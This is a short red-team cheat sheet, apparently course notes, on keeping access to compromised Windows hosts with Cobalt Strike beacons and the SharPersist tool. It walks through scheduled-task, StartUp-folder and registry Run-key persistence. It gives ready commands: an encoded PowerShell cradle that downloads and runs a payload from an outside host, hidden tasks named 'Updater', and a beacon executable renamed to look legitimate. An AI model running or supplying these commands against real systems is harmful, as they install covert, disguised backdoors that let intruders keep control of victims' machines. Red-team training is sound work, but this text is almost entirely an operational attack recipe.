# Task Scheduler persistence

Create base64 command to download and execute your beacon

```bash
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
...(copy contents)
```

Create a task through the beacon interactive shell

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAA..." -n "Updater" -m add -o hourly
```

---

# StartUp Folder persistence

Create base64 command to download and execute your beacon

```bash
$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
...(copy contents)
```

Create a task through the beacon interactive shell

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAA..." -f "UserEnvSetup" -m add
```

---

# Registry Autorun persistence

Create a http payload in cobalt strike

```bash
upload C:\Payloads\http_x64.exe
mv http_x64.exe Updater.exe
```

Create an AutoRun through the beacon interactive shell

```bash
execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
```

---

# Hunting for COM Hijacks

```bash
https://training.zeropointsecurity.co.uk/courses/take/red-team-ops/texts/38149212-hunting-for-com-hijacks
```
---

# TODO (certificates)
